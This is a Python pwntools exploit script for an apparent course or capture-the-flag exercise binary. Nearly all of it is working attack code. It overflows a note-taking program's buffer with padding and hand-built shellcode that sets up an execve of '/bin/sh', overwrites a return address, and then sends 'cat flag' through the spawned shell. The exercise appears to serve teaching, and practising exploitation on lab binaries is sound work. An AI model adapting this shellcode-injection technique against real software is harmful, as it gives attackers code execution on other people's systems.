#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise6/exercise6b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

ADD_NOTE = b"1"
SHOW_NOTES = b"2"
PADDING = 26

r = start()

r.sendline(ADD_NOTE)
r.recvline()

note = b"x" * PADDING + b"\x90" * 2
note += asm("xor r12, r12\nmov rsi, r13\nsub rsi, rax", arch = 'amd64')
note += asm("lea r8, [rsi + 0xE]", arch = 'amd64')
note += asm("lea rdi, [r8 + 0x1]\nlea r8, [r8 + 0x8]\nmov [r8], r12\nlea r12, [r12 + 0x4]\nlea r12, [r12 + 0x1]\nsal r12, 0x8", arch = 'amd64')
note += asm("lea r12, [r12 + 0xE]\nlea r12, [r12 + 0x1]\nlea r8, [rsi - 0x3]\nmov [r8], r12", arch = 'amd64')
note += asm("xor r8, r8\nmov rsi, r8\nmov rdx, r8\nxor r12, r12\nlea rax, [r12 + 0x3B]", arch = 'amd64')
note += 16 * (36966).to_bytes(length=2, byteorder='little')
note += b"y" * 5
note += b"/bin/sh"
note += b"z" * PADDING * 4 
note += (4199958).to_bytes(length=8, byteorder='little')
note += b"\ncat flag"

r.sendline(note)

flag_output = r.recvall(timeout=1)
print(flag_output.decode(errors='ignore'))
